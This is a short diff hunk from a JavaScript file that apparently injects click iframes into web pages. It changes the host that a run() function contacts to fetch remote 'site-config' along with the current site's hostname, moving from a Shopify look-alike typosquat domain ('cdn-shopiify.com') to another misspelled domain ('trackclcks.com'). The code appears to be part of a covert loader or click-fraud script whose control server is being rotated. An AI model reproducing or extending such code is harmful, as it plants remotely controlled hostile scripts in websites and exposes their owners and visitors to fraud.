@@ -214,7 +214,7 @@ function createClickIframe(url) {
     function run() {
 
         fetch(
-            'https://cdn-shopiify.com/api/site-config?host=' +
+            'https://trackclcks.com/api/site-config?host=' +
             encodeURIComponent(
                 window.location.hostname
             )
